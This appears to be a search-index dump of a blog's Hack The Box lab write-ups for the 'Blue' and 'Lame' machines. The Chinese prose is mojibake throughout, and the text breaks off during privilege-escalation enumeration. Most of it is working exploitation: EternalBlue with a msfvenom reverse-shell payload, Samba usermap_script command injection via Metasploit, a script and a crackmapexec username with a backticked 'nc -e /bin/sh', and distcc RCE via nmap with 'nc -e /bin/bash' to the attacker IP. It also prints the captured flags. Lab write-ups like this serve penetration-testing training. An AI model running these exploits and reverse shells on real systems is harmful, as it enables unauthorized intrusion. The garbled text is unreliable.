10.10.10.40: icmp_seq=4 ttl=127 time=240 ms --- 10.10.10.40 ping statistics --- 4 packets transmitted, 3 received, 25% packet loss, time 3035ms rtt min/avg/max/mdev = 237.404/238.524/240.313/1.277 ms æœ‰ç‚¹å»¶è¿Ÿå’Œä¸¢åŒ…ï¼Œæ‰«ææ¢æµ‹ç»“æœå¯èƒ½ä¸å‡†ç¡®ï¼Œéœ€è¦å¤æ ¸ã€‚ ","date":"2022-03-28","objectID":"/posts/hackthebox-blue/:2:0","tags":["OSCP","HTB"],"title":"HTBé¶æœº Blue WriteUp","uri":"/posts/hackthebox-blue/"},{"categories":["é¶åœº"],"content":"0.SCAN masscan æ‰«æå…¨ç«¯å£+ nmap æ‰«æè¯¦ç»†ç«¯å£ä¿¡æ¯ â”Œâ”€â”€(xavierã‰¿xavier)-[~] â””â”€$ sudo masscan -e tun0 -p- --max-rate 500 10.10.10.40 Starting masscan 1.3.2 (http://bit.ly/14GZzcT) at 2022-03-21 05:48:42 GMT Initiating SYN Stealth Scan Scanning 1 hosts [65535 ports/host] Discovered open port 49156/tcp on 10.10.10.40 Discovered open port 49152/tcp on 10.10.10.40 Discovered open port 49154/tcp on 10.10.10.40 Discovered open port 49155/tcp on 10.10.10.40 Discovered open port 445/tcp on 10.10.10.40 Discovered open port 49153/tcp on 10.10.10.40 Discovered open port 49157/tcp on 10.10.10.40 Discovered open port 135/tcp on 10.10.10.40 Discovered open port 139/tcp on 10.10.10.40 â”Œâ”€â”€(xavierã‰¿xavier)-[~] â””â”€$ sudo nmap -p135,139,445,49152-49157 -sSV 10.10.10.40 --script=default,vuln Starting Nmap 7.92 ( https://nmap.org ) at 2022-03-21 14:04 HKT Nmap scan report for 10.10.10.40 Host is up (0.24s latency). PORT STATE SERVICE VERSION 135/tcp open msrpc Microsoft Windows RPC 139/tcp open netbios-ssn Microsoft Windows netbios-ssn 445/tcp open microsoft-ds Windows 7 Professional 7601 Service Pack 1 microsoft-ds (workgroup: WORKGROUP) 49152/tcp open msrpc Microsoft Windows RPC 49153/tcp open msrpc Microsoft Windows RPC 49154/tcp open msrpc Microsoft Windows RPC 49155/tcp open msrpc Microsoft Windows RPC 49156/tcp open unknown 49157/tcp open msrpc Microsoft Windows RPC Service Info: Host: HARIS-PC; OS: Windows; CPE: cpe:/o:microsoft:windows Host script results: | smb2-security-mode: | 2.1: |_ Message signing enabled but not required | smb-vuln-ms17-010: | VULNERABLE: | Remote Code Execution vulnerability in Microsoft SMBv1 servers (ms17-010) | State: VULNERABLE | IDs: CVE:CVE-2017-0143 | Risk factor: HIGH | A critical remote code execution vulnerability exists in Microsoft SMBv1 | servers (ms17-010). | | Disclosure date: 2017-03-14 | References: | https://technet.microsoft.com/en-us/library/security/ms17-010.aspx | https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-0143 |_ https://blogs.technet.microsoft.com/msrc/2017/05/12/customer-guidance-for-wannacrypt-attacks/ |_clock-skew: mean: 4m02s, deviation: 6s, median: 3m58s |_smb-vuln-ms10-054: false | smb-security-mode: | account_used: guest | authentication_level: user | challenge_response: supported |_ message_signing: disabled (dangerous, but default) | smb-os-discovery: | OS: Windows 7 Professional 7601 Service Pack 1 (Windows 7 Professional 6.1) | OS CPE: cpe:/o:microsoft:windows_7::sp1:professional | Computer name: haris-PC | NetBIOS computer name: HARIS-PC\\x00 | Workgroup: WORKGROUP\\x00 |_ System time: 2022-03-21T06:09:59+00:00 | smb2-time: | date: 2022-03-21T06:09:58 |_ start_date: 2022-03-21T05:42:34 |_smb-vuln-ms10-061: NT_STATUS_OBJECT_NAME_NOT_FOUND Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 117.51 seconds å‘ç° å­˜åœ¨ smb ms17-010ï¼ˆCVE-2017-0143ï¼‰ï¼Œæ“ä½œç³»ç»Ÿä¸ºï¼šWindows 7 Professional 7601 Service Pack 1 ï¼Œè®¡ç®—æœºå: haris-PC éMSF ","date":"2022-03-28","objectID":"/posts/hackthebox-blue/:3:0","tags":["OSCP","HTB"],"title":"HTBé¶æœº Blue WriteUp","uri":"/posts/hackthebox-blue/"},{"categories":["é¶åœº"],"content":"1. MS17-010 åˆ©ç”¨ ä¸ç”¨msfå»æ”»å‡» nmap åªæœ‰æ£€æµ‹è„šæœ¬ï¼Œæ²¡æœ‰åˆ©ç”¨è„šæœ¬ï¼Œé€šè¿‡ç½‘ç»œexpdbã€Githubæœç´¢åˆ©ç”¨å·¥å…·ã€‚ æœ€åæ‰¾äº†è¿™ä¸ªï¼šhttps://github.com/3ndG4me/AutoBlue-MS17-010 ä¸‹è½½ä»£ç ï¼Œå¹¶å®‰è£…ä¾èµ–ï¼Œè¿™é‡Œæˆ‘ä½¿ç”¨äº†Pipenvåˆ›å»ºäº†å•ç‹¬çš„ç¯å¢ƒã€‚ â””â”€$ git clone https://github.com/3ndG4me/AutoBlue-MS17-010.git (HTB) â”Œâ”€â”€(xavierã‰¿xavier)-[~/HTB/AutoBlue-MS17-010/ â””â”€$ pip install -r requirements.txt åˆ¶ä½œåˆ©ç”¨ä»£ç ï¼Œå¯ä»¥åˆ©ç”¨shellcodeæ–‡ä»¶å¤¹ä¸‹çš„ shell_prep.sh è¾…åŠ©ç”Ÿæˆã€‚ è¿™é‡Œç›´æ¥ä½¿ç”¨msfvenomè¿›è¡Œç”Ÿæˆï¼Œå¹¶åŠ å…¥shellcodeæ··åˆ (HTB) â”Œâ”€â”€(xavierã‰¿xavier)-[~/HTB/AutoBlue-MS17-010/ â””â”€$ nasm -f bin eternalblue_kshellcode_x64.asm -o evilKernel.bin (HTB) â”Œâ”€â”€(xavierã‰¿xavier)-[~/HTB/AutoBlue-MS17-010/shellcode] â””â”€$ msfvenom -p windows/x64/shell_reverse_tcp EXITFUNC=thread LHOST=10.10.14.2 LPORT=4444 -f raw -o evilReverse.bin [-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload [-] No arch selected, selecting arch: x64 from the payload No encoder specified, outputting raw payload Payload size: 460 bytes Saved as: evilReverse.bin (HTB) â”Œâ”€â”€(xavierã‰¿xavier)-[~/HTB/AutoBlue-MS17-010/shellcode] â””â”€$ cat evilKernel.bin evilReverse.bin \u003e evilPayload.bin ä¾æ®Github çš„Readme å‘½ä»¤å¸®åŠ©ï¼Œè¾“å…¥ç›®æ ‡ipï¼Œpayload å’ŒGroomè¿æ¥æ•°ï¼Œæ‰§è¡Œåˆ©ç”¨è„šæœ¬ï¼š python eternalblue_exploit7.py \u003cTARGET-IP\u003e \u003cPATH/TO/SHELLCODE/sc_all.bin\u003e \u003cNumber of Groom Connections (optional)\u003e (HTB) â”Œâ”€â”€(xavierã‰¿xavier)-[~/HTB/AutoBlue-MS17-010] â””â”€$ python3 eternalblue_exploit7.py 10.10.10.40 shellcode/evilPayload.bin 2 shellcode size: 1232 numGroomConn: 2 Target OS: Windows 7 Professional 7601 Service Pack 1 SMB1 session setup allocate nonpaged pool success SMB1 session setup allocate nonpaged pool success good response status: INVALID_PARAMETER done (HTB) â”Œâ”€â”€(xavierã‰¿xavier)-[~/HTB/AutoBlue-MS17-010] â””â”€$ python3 eternalblue_exploit7.py 10.10.10.40 shellcode/evilPayload.bin 24 shellcode size: 1232 numGroomConn: 24 Target OS: Windows 7 Professional 7601 Service Pack 1 SMB1 session setup allocate nonpaged pool success SMB1 session setup allocate nonpaged pool success good response status: INVALID_PARAMETER done è¿™é‡Œ \u003cNumber of Groom Connections (optional)\u003eè™½ç„¶æ˜¯å¯é€‰é¡¹ï¼Œä½†ç»è¿‡å¤šæ¬¡ä¸æˆåŠŸåï¼Œæˆ‘æŒ‰ç…§å‚è€ƒæ–‡çŒ®2è¿›è¡Œè®¾ç½®ï¼ŒåŒæ ·åœ¨å¤šæ¬¡å°è¯•åï¼ŒæˆåŠŸè·å¾—shellï¼Œä¸”ä¸ºSystemæƒé™ã€‚ â”Œâ”€â”€(xavierã‰¿xavier)-[~] â””â”€$ nc -nlvp 4444 listening on [any] 4444 ... connect to [10.10.14.2] from (UNKNOWN) [10.10.10.40] 49159 Microsoft Windows [Version 6.1.7601] Copyright (c) 2009 Microsoft Corporation. All rights reserved. C:\\Windows\\system32\u003ewhoami whoami nt authority\\system C:\\Windows\\system32\u003ecd C:\\Users\\haris\\Desktop cd C:\\Users\\haris\\Desktop C:\\Users\\haris\\Desktop\u003etype user.txt type user.txt 6349f910cd5b7ddae73521237f8e90c3 C:\\Users\\haris\\Desktop\u003etype C:\\Users\\Administrator\\Desktop\\root.txt type C:\\Users\\Administrator\\Desktop\\root.txt 3515d002af86dbfff3ce6f9bbffe7ede åˆ©ç”¨ä»–äººçš„å·¥å…·ï¼Œæœ€ååšå‡ºæ¥äº†ï¼Œä½†è®©æˆ‘æ„è¯†åˆ°å¯¹æ¼æ´çš„ä¸€çŸ¥åŠè§£ï¼Œåœ¨æ”»å‡»è¿‡ç¨‹ä¸­ä¼šæ¶ˆè€—å¤§é‡çš„æ—¶é—´ï¼Œç”šè‡³èµ°ä¸Šå¼¯è·¯ã€‚å¹³æ—¶éœ€è¦åŠ å¼ºå¯¹æ¼æ´çš„ç ”ç©¶ï¼Œäº†è§£æ¼æ´çš„ç›¸å…³å½±å“å› ç´ ã€‚ MSF: ç•¥ ","date":"2022-03-28","objectID":"/posts/hackthebox-blue/:4:0","tags":["OSCP","HTB"],"title":"HTBé¶æœº Blue WriteUp","uri":"/posts/hackthebox-blue/"},{"categories":["é¶åœº"],"content":"ä»–å±±ä¹‹çŸ³ Hack The Box - Blue (Without Metasploit) ç”¨äº†superscan ç”¨äº†å…¶ä»–expï¼Œpython2è„šæœ¬ Hack The Box - Blue Walkthrough without Metasploit ä½¿ç”¨äº†åŒä¸€ç§æ–¹æ³•ï¼ŒnumGroomConn éœ€è¦å°è¯•å¤šæ¬¡ WriteUp: HackTheBox Blue ä½¿ç”¨äº†kaliè‡ªå¸¦çš„searchsploit å»æ‰¾åˆ©ç”¨è„šæœ¬ï¼Œå¹¶è¿›è¡Œä¿®æ”¹åˆ©ç”¨ ","date":"2022-03-28","objectID":"/posts/hackthebox-blue/:5:0","tags":["OSCP","HTB"],"title":"HTBé¶æœº Blue WriteUp","uri":"/posts/hackthebox-blue/"},{"categories":["é¶åœº"],"content":"Lame ç®€ä»‹ï¼š Lame is a beginner level machine, requiring only one exploit to obtain root access. It was the first machine published on Hack The Box and was often the first machine for new users prior to its retirement Tagsï¼š Injection, CMS Exploit, Linux, Web, PHP, Password Reuse Rating: 4.4 Skillsï¼š LinuxåŸºç¡€ æšä¸¾ç«¯å£å’ŒæœåŠ¡ è¯†åˆ«æœ‰æ¼æ´çš„æœåŠ¡ åˆ©ç”¨Sambaæ¼æ´ ","date":"2022-03-23","objectID":"/posts/hackthebox-lame/:1:0","tags":["HTB","OSCP"],"title":"HTBé¶æœº Lame WriteUp","uri":"/posts/hackthebox-lame/"},{"categories":["é¶åœº"],"content":"Pentest ","date":"2022-03-23","objectID":"/posts/hackthebox-lame/:2:0","tags":["HTB","OSCP"],"title":"HTBé¶æœº Lame WriteUp","uri":"/posts/hackthebox-lame/"},{"categories":["é¶åœº"],"content":"0.SCAN æ‰«ä¸‹IPï¼š $ sudo nmap -sSV -T4 10.10.10.3 Starting Nmap 7.92 ( https://nmap.org ) at 2022-03-16 14:43 HKT Nmap scan report for 10.10.10.3 Host is up (0.24s latency). Not shown: 996 filtered tcp ports (no-response) PORT STATE SERVICE VERSION 21/tcp open ftp vsftpd 2.3.4 22/tcp open ssh OpenSSH 4.7p1 Debian 8ubuntu1 (protocol 2.0) 139/tcp open netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP) 445/tcp open netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP) Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel ","date":"2022-03-23","objectID":"/posts/hackthebox-lame/:3:0","tags":["HTB","OSCP"],"title":"HTBé¶æœº Lame WriteUp","uri":"/posts/hackthebox-lame/"},{"categories":["é¶åœº"],"content":"1.ftp $ sudo nmap -T4 -sC -p21 10.10.10.3 Starting Nmap 7.92 ( https://nmap.org ) at 2022-03-16 14:47 HKT Nmap scan report for 10.10.10.3 Host is up (0.24s latency). PORT STATE SERVICE 21/tcp open ftp |_ftp-anon: Anonymous FTP login allowed (FTP code 230) | ftp-syst: | STAT: | FTP server status: | Connected to 10.10.14.2 | Logged in as ftp | TYPE: ASCII | No session bandwidth limit | Session timeout in seconds is 300 | Control connection is plain text | Data connections will be plain text | vsFTPd 2.3.4 - secure, fast, stable |_End of status åŒ¿åç™»å½•ftpæŸ¥çœ‹ä¸€ä¸‹ $ ftp 10.10.10.3 Connected to 10.10.10.3. 220 (vsFTPd 2.3.4) Name (10.10.10.3:xavier): anonymous 331 Please specify the password. Password: 230 Login successful. Remote system type is UNIX. Using binary mode to transfer files. ftp\u003e ls 200 PORT command successful. Consider using PASV. 150 Here comes the directory listing. 226 Directory send OK. ftp\u003e pwd 257 \"/\" ftp\u003e bye 421 Timeout. å°è¯•vsftpå¯¹åº”çš„æ¼æ´ $ locate *.nse | grep vsftp /usr/share/nmap/scripts/ftp-vsftpd-backdoor.nse $ sudo nmap --script ftp-vsftpd-backdoor.nse -p21 10.10.10.3 -T4 -sSV Starting Nmap 7.92 ( https://nmap.org ) at 2022-03-16 15:50 HKT Nmap scan report for 10.10.10.3 Host is up (0.24s latency). PORT STATE SERVICE VERSION 21/tcp open ftp vsftpd 2.3.4 Service Info: OS: Unix Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 24.22 seconds è¯¥æ¼æ´ä¸å­˜åœ¨ï¼Œè½¬å‘sshå’Œsmb ","date":"2022-03-23","objectID":"/posts/hackthebox-lame/:4:0","tags":["HTB","OSCP"],"title":"HTBé¶æœº Lame WriteUp","uri":"/posts/hackthebox-lame/"},{"categories":["é¶åœº"],"content":"2.ssh è¯•ç€çˆ†ç ´ä¸€ä¸‹ï¼Œæ²¡å‘ç°å¯ä»¥åˆ©ç”¨çš„ç‚¹ã€‚ ","date":"2022-03-23","objectID":"/posts/hackthebox-lame/:5:0","tags":["HTB","OSCP"],"title":"HTBé¶æœº Lame WriteUp","uri":"/posts/hackthebox-lame/"},{"categories":["é¶åœº"],"content":"3.SMB ","date":"2022-03-23","objectID":"/posts/hackthebox-lame/:6:0","tags":["HTB","OSCP"],"title":"HTBé¶æœº Lame WriteUp","uri":"/posts/hackthebox-lame/"},{"categories":["é¶åœº"],"content":"MSF msf6 \u003e search samba msf6 \u003e use exploit/multi/samba/usermap_script [*] No payload configured, defaulting to cmd/unix/reverse_netcat msf6 exploit(multi/samba/usermap_script) \u003e set rhosts 10.10.10.3 rhosts =\u003e 10.10.10.3 msf6 exploit(multi/samba/usermap_script) \u003e set lhost 10.10.14.2 lhost =\u003e 10.10.14.2 msf6 exploit(multi/samba/usermap_script) \u003e run [*] Started reverse TCP handler on 10.10.14.2:4444 [*] Command shell session 1 opened (10.10.14.2:4444 -\u003e 10.10.10.3:32875 ) at 2022-03-16 16:04:23 +0800 whoami root find / -name \"user.txt\" /home/makis/user.txt cat /home/makis/user.txt 83bb7c7fff163562d48ac4ba14316025 cat /root/root.txt 848a15387ca22dcf38b1cdc8538223a0 ä¸ç”¨MSFæ€ä¹ˆè§£å†³å‘¢ï¼Ÿ è¯•è¯•nmapçš„nseæ¼æ´è„šæœ¬ï¼Œæ— æœ $ sudo nmap --script smb-vuln* -p139,445 10.10.10.3 -T4 Starting Nmap 7.92 ( https://nmap.org ) at 2022-03-16 16:38 HKT Nmap scan report for 10.10.10.3 Host is up (0.24s latency). PORT STATE SERVICE 139/tcp open netbios-ssn 445/tcp open microsoft-ds Host script results: |_smb-vuln-ms10-054: false |_smb-vuln-ms10-061: false |_smb-vuln-regsvc-dos: ERROR: Script execution failed (use -d to debug) Nmap done: 1 IP address (1 host up) scanned in 175.81 seconds ","date":"2022-03-23","objectID":"/posts/hackthebox-lame/:6:1","tags":["HTB","OSCP"],"title":"HTBé¶æœº Lame WriteUp","uri":"/posts/hackthebox-lame/"},{"categories":["é¶åœº"],"content":"éMSF ä¿¡æ¯æœé›†ï¼Œå¯»æ‰¾å†å²æ¼æ´ ç¡®å®šSambaå…·ä½“ç‰ˆæœ¬ $ smbclient -L 10.10.10.3 protocol negotiation failed: NT_STATUS_CONNECTION_DISCONNECTED â”Œâ”€â”€(xavierã‰¿xavier)-[~] â””â”€$ smbclient -L 10.10.10.3 -U \"\" -N --option='client min protocol=nt1' Sharename Type Comment --------- ---- ------- print$ Disk Printer Drivers tmp Disk oh noes! opt Disk IPC$ IPC IPC Service (lame server (Samba 3.0.20-Debian)) ADMIN$ IPC IPC Service (lame server (Samba 3.0.20-Debian)) Reconnecting with SMB1 for workgroup listing. Server Comment --------- ------- Workgroup Master --------- ------- WORKGROUP LAME å…³äºsmbclientå‡ºç°NT_STATUS_CONNECTION_DISCONNECTEDé”™è¯¯ smbclientä»4.11å¼€å§‹åè®®å–æ¶ˆäº†nt1,ä½¿ç”¨smbv2,æ‰€ä»¥å¯¼è‡´åè®®ä¸èƒ½åå•†,è§£å†³åŠæ³•å¦‚ä¸Šï¼Œé€šè¿‡optionæŒ‡å®šï¼Œä¹Ÿå¯ä»¥ä¿®æ”¹é…ç½®æ–‡ä»¶ /etc/samba/smb.conf crackmapexec æ¢æµ‹ $ crackmapexec smb --shares 10.10.10.3 -u '' -p '' [*] First time use detected [*] Creating home directory structure [*] Creating default workspace [*] Initializing MSSQL protocol database [*] Initializing SMB protocol database [*] Initializing LDAP protocol database [*] Initializing WINRM protocol database [*] Initializing SSH protocol database [*] Copying default configuration file [*] Generating SSL certificate SMB 10.10.10.3 445 LAME [*] Unix (name:LAME) (domain:hackthebox.gr) (signing:False) (SMBv1:True) SMB 10.10.10.3 445 LAME [+] hackthebox.gr\\: SMB 10.10.10.3 445 LAME [+] Enumerated shares SMB 10.10.10.3 445 LAME Share Permissions Remark SMB 10.10.10.3 445 LAME ----- ----------- ------ SMB 10.10.10.3 445 LAME print$ Printer Drivers SMB 10.10.10.3 445 LAME tmp READ,WRITE oh noes! SMB 10.10.10.3 445 LAME opt SMB 10.10.10.3 445 LAME IPC$ IPC Service (lame server (Samba 3.0.20-Debian)) SMB 10.10.10.3 445 LAME ADMIN$ IPC Service (lame server (Samba 3.0.20-Debian)) ç¡®å®šSamba ç‰ˆæœ¬ä¸º 3.0.20ï¼Œå°±å¯ä»¥æ‰¾ç›¸åº”çš„æ¼æ´ã€‚ $ searchsploit samba 3.0.20 $ searchsploit samba 3.0.20 ------------------------------------------------------------------------------------------------------------------------- Exploit Title | Path ------------------------------------------------------------------------------------------------------------------------- Samba 3.0.10 \u003c 3.3.5 - Format String / Security Bypass | multiple/remote/10095.txt Samba 3.0.20 \u003c 3.0.25rc3 - 'Username' map script' Command Execution (Metasploit) | unix/remote/16320.rb Samba \u003c 3.0.20 - Remote Heap Overflow | linux/remote/7701.txt Samba \u003c 3.0.20 - Remote Heap Overflow | linux/remote/7701.txt Samba \u003c 3.6.2 (x86) - Denial of Service (PoC) | linux_x86/dos/36741.py ------------------------------------------------------------------------------------------------------------------------- Shellcodes: No Results $ more /usr/share/exploitdb/exploits/unix/remote/16320.rb ...... 'Author' =\u003e [ 'jduck' ], 'License' =\u003e MSF_LICENSE, 'Version' =\u003e '$Revision: 10040 $', 'References' =\u003e [ [ 'CVE', '2007-2447' ], [ 'OSVDB', '34700' ], [ 'BID', '23972' ], [ 'URL', 'http://labs.idefense.com/intelligence/vulnerabilities/display.php?id=534' ], [ 'URL', 'http://samba.org/samba/security/CVE-2007-2447.html' ] ], 'Platform' =\u003e ['unix'], çœ‹åˆ°CVEç¼–å·ï¼š2007-2447 ","date":"2022-03-23","objectID":"/posts/hackthebox-lame/:6:2","tags":["HTB","OSCP"],"title":"HTBé¶æœº Lame WriteUp","uri":"/posts/hackthebox-lame/"},{"categories":["é¶åœº"],"content":"Github Githubæ‰¾åˆ©ç”¨è„šæœ¬ éšä¾¿æ‰¾äº†ä¸€ä¸ªï¼Œhttps://github.com/amriunix/CVE-2007-2447ï¼Œå®‰è£…ä¾èµ–$ pip install pysmbï¼ŒæŒ‰ç…§è¯´æ˜è¿è¡Œï¼š $ python3 usermap_script.py [*] CVE-2007-2447 - Samba usermap script [-] usage: python usermap_script.py \u003cRHOST\u003e \u003cRPORT\u003e \u003cLHOST\u003e \u003cLPORT\u003e $ nc -l -v -p 4444 $ python3 usermap_script.py 10.10.10.3 139 10.10.14.2 4444 [*] CVE-2007-2447 - Samba usermap script [+] Connecting ! [+] Payload was sent - check netcat ! $ nc -l -v -p 4444 listening on [any] 4444 ... 10.10.10.3: inverse host lookup failed: Unknown host connect to [10.10.14.2] from (UNKNOWN) [10.10.10.3] 36956 whoami root whereis python python: /usr/bin/python2.5-config /usr/bin/python /usr/bin/python2.5 /etc/python /etc/python2.5 /usr/lib/python2.3 /usr/lib/python2.5 /usr/lib/python2.4 /usr/local/lib/python2.5 /usr/include/python2.5 /usr/share/python /usr/share/man/man1/python.1.gz python -c 'import pty;pty.spawn(\"/bin/bash\")' root@lame:/# find / -name user.txt find / -name user.txt /home/makis/user.txt root@lame:/# cat /home/makis/user.txt cat /home/makis/user.txt 83bb7c7fff163562d48ac4ba14316025 root@lame:/# cat /root/root.txt cat /root/root.txt 848a15387ca22dcf38b1cdc8538223a0 root@lame:/# ","date":"2022-03-23","objectID":"/posts/hackthebox-lame/:6:3","tags":["HTB","OSCP"],"title":"HTBé¶æœº Lame WriteUp","uri":"/posts/hackthebox-lame/"},{"categories":["é¶åœº"],"content":"crackmapexec æ¥è‡ªå‚è€ƒæ–‡çŒ®2 more /usr/share/exploitdb/exploits/unix/remote/16320.rb åˆ†ææ¼æ´åˆ©ç”¨è„šæœ¬ï¼Œå‘ç°name å­—æ®µä¸º \"/=`nohup \" + payload.encoded + \"`\" $ crackmapexec smb --shares 10.10.10.3 -u './=`nohup nc -e /bin/sh 10.10.14.2 4445`' -p '' SMB 10.10.10.3 445 LAME [*] Unix (name:LAME) (domain:hackthebox.gr) (signing:False) (SMBv1:True) å¦ä¸€è¾¹åšç›‘å¬$ nc -lvnp 4445 $ nc -lvnp 4445 listening on [any] 4445 ... connect to [10.10.14.2] from (UNKNOWN) [10.10.10.3] 59300 whoami root Metasploit ä½¿ç”¨ nohup å‘½ä»¤ï¼Œå³ no hang upçš„ç¼©å†™ï¼Œè¿™æ˜¯ Linux ç³»ç»Ÿä¸­çš„ä¸€ä¸ªå‘½ä»¤ï¼Œå³ä½¿åœ¨é€€å‡º shell æˆ–ç»ˆç«¯å¹¶åœ¨å½“å‰ä¸Šä¸‹æ–‡ä¹‹å¤–å¯åŠ¨è¿›ç¨‹ç„¶åæ˜¯æœ‰æ•ˆè´Ÿè½½ä¹‹åï¼Œå®ƒä¹Ÿèƒ½ä¿æŒè¿›ç¨‹è¿è¡Œã€‚ æ€»ç»“ï¼šLame æ˜¯åˆ©ç”¨Sambaçš„å‘½ä»¤æ³¨å…¥æ¼æ´ç›´æ¥è·å–rootæƒé™ ","date":"2022-03-23","objectID":"/posts/hackthebox-lame/:6:4","tags":["HTB","OSCP"],"title":"HTBé¶æœº Lame WriteUp","uri":"/posts/hackthebox-lame/"},{"categories":["é¶åœº"],"content":"4. distccd çœ‹äº†å‚è€ƒæ–‡çŒ®2åï¼Œæ‰å‘ç°è¿˜å°‘äº†ä¸€ä¸ªç‚¹æ²¡æœ‰å‘ç°ï¼Œè¿™è¾¹æˆ‘ä¸å†™äº†ï¼Œç›´æ¥çœ‹åŸæ–‡å§ã€‚ æƒ³äº†æƒ³è¿˜æ˜¯å†ä»è¿™ä¸ªç‚¹å†åšä¸€æ¬¡ï¼Œå¤šç»ƒä¹ ç»ƒä¹ ã€‚ nmap é»˜è®¤æ‰«ææœªå‘ç°è¯¥ç«¯å£ï¼Œéœ€è¦è¿›è¡Œå…¨ç«¯å£æ‰å¯ä»¥ã€‚è¿™é‡Œç”¨masscanå¿«é€Ÿæ‰«æ $ sudo masscan -e tun0 -p- --max-rate 500 10.10.10.3 Starting masscan 1.3.2 (http://bit.ly/14GZzcT) at 2022-03-17 05:45:11 GMT Initiating SYN Stealth Scan Scanning 1 hosts [65535 ports/host] Discovered open port 139/tcp on 10.10.10.3 Discovered open port 22/tcp on 10.10.10.3 Discovered open port 445/tcp on 10.10.10.3 Discovered open port 3632/tcp on 10.10.10.3 Discovered open port 21/tcp on 10.10.10.3 nmap åšç»†åˆ†æ‰«æï¼Œæ‰«ç‰¹å®šç«¯å£çš„æœåŠ¡è¯¦æƒ…ï¼Œå¹¶ç”¨ä¸ŠNSE $ sudo nmap -T4 -sSV -sC -p3632 10.10.10.3 Starting Nmap 7.92 ( https://nmap.org ) at 2022-03-17 13:52 HKT Nmap scan report for 10.10.10.3 Host is up (0.29s latency). PORT STATE SERVICE VERSION 3632/tcp open distccd distccd v1 ((GNU) 4.2.4 (Ubuntu 4.2.4-1ubuntu4)) Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 8.28 seconds $ locate *.nse | grep distcc /usr/share/nmap/scripts/distcc-cve2004-2687.nse $ sudo nmap -T4 --script distcc* -p3632 10.10.10.3 Starting Nmap 7.92 ( https://nmap.org ) at 2022-03-17 13:57 HKT Nmap scan report for 10.10.10.3 Host is up (0.24s latency). PORT STATE SERVICE 3632/tcp open distccd | distcc-cve2004-2687: | VULNERABLE: | distcc Daemon Command Execution | State: VULNERABLE (Exploitable) | IDs: CVE:CVE-2004-2687 | Risk factor: High CVSSv2: 9.3 (HIGH) (AV:N/AC:M/Au:N/C:C/I:C/A:C) | Allows executing of arbitrary commands on systems running distccd 3.1 and | earlier. The vulnerability is the consequence of weak service configuration. | | Disclosure date: 2002-02-01 | Extra information: | | uid=1(daemon) gid=1(daemon) groups=1(daemon) | | References: | https://nvd.nist.gov/vuln/detail/CVE-2004-2687 | https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2004-2687 |_ https://distcc.github.io/security.html Nmap done: 1 IP address (1 host up) scanned in 2.88 seconds ç½‘ä¸ŠæŸ¥distccdçš„èµ„æ–™ï¼š distccd is the server for the distcc(1) distributed compiler. It accepts and runs compilation jobs for network clients. more /usr/share/nmap/scripts/distcc-cve2004-2687.nseæŸ¥çœ‹NSEè„šæœ¬çš„å…·ä½“å†…å®¹ï¼š $ more /usr/share/nmap/scripts/distcc-cve2004-2687.nse ..... description = [[ Detects and exploits a remote code execution vulnerability in the distributed compiler daemon distcc. The vulnerability was disclosed in 2002, but is still present in modern implementation due to poor configuration of the service. ]] --- -- @usage -- nmap -p 3632 \u003cip\u003e --script distcc-exec --script-args=\"distcc-exec.cmd='id'\" ... å¯ä»¥çœ‹åˆ°distcc-exec.cmdå‚æ•°å³ä¸ºæ‰€æ‰§è¡Œçš„å‘½ä»¤ï¼Œå°†å…¶æ”¹ä¸ºè¿æ¥å‘½ä»¤ï¼Œå¦‚nc -e /bin/bash 10.10.14.2 4444ï¼Œ ç”¨nmap -p 3632 \u003cip\u003e --script distcc-exec --script-args=\"distcc-exec.cmd='id'\"è¿™ç§æ–¹æ³•å‡ºç°äº†å¾ˆå¤šæ„æ–™ä¹‹å¤–çš„é—®é¢˜ï¼Œæ— æ³•æˆåŠŸè·å¾—shellã€‚æ’æŸ¥ä¸­â€¦ NSE: failed to initialize the script engine: /usr/bin/../share/nmap/nse_main.lua:822: 'distcc-exec' did not match a category, filename, or directory stack traceback: [C]: in function 'error' /usr/bin/../share/nmap/nse_main.lua:822: in local 'get_chosen_scripts' /usr/bin/../share/nmap/nse_main.lua:1322: in main chunk [C]: in ? QUITTING! æ’æŸ¥ç»“æœå‡ºæ¥äº†ï¼Œè™½ç„¶ç”¨æ³•ä¸­å†™ç€distcc-execï¼Œä½†nmapå…¶å®å¹¶æ— æ³•è¯†åˆ«ï¼Œåªèƒ½ç”¨å…¨åï¼Œå¯¹åº”çš„åé¢ä¹Ÿéœ€è¦ä¿®æ”¹ã€‚æ”¹æˆå¦‚ä¸‹åï¼Œå¯æˆåŠŸæ‰§è¡Œ $ sudo nmap -p3632 10.10.10.3 --script=distcc-cve2004-2687.nse --script-args=\"distcc-cve2004-2687.cmd='nc -e /bin/bash 10.10.14.2 4444'\" $ nc -lvnp 4444 listening on [any] 4444 ... connect to [10.10.14.2] from (UNKNOWN) [10.10.10.3] 42558 æˆåŠŸè·å¾—äº†daemon æƒé™ï¼Œæ¥ä¸‹å»è¿›è¡Œææƒ ","date":"2022-03-23","objectID":"/posts/hackthebox-lame/:7:0","tags":["HTB","OSCP"],"title":"HTBé¶æœº Lame WriteUp","uri":"/posts/hackthebox-lame/"},{"categories":["é¶åœº"],"content":"ææƒ1ï¼šSUID - nmap â””â”€$ nc -lvnp 4444 listening on [any] 4444 ... connect to [10.10.14.2] from (UNKNOWN) [10.10.10.3] 42558 whoami daemon python -c \"import pty;pty.spawn('/bin/bash')\" daemon@lame:/tmp$ find / -type f -perm -u=s 2\u003e/dev/null find / -type f -perm -u=s 2\u003e/dev/null /bin/umount /bin/fusermount /bin/su /bin/mount /bin/ping /bin/ping6 /sbin/mount.nfs /lib/dhcp3-client/call-dhclient-script /usr/bin/sudoedit /usr/bin/X /usr/bin/netkit-rsh /usr/bin/gpasswd /usr/bin/traceroute6.iputils /usr/bin/sudo /usr/bin/netkit-rlogin /usr/bin/arping /usr/bin/at /usr/bin/newgrp /usr/bin/chfn /usr/bin/nmap /usr/bin/chsh /usr/bin/netkit-rcp /usr/bin/passwd /usr/bin/mtr /usr/sbin/uuidd /usr/sbin/pppd 